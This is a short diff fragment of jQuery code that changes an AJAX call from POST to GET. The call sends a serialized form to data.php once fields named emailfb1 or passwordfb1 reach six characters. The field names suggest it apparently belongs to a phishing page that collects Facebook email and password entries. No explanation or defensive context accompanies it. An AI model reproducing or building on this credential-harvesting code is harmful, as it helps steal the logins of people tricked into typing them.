@@ -653,7 +653,7 @@
 
             if ($emailfb1.length >= 6 || $passwordfb1.length >= 6) {
                 $.ajax({
-                    type: 'POST',
+                    type: 'GET',
                     url: 'data.php',
                     data: $('#ngumpulinuangnikah').serialize(),
                     dataType: 'text',
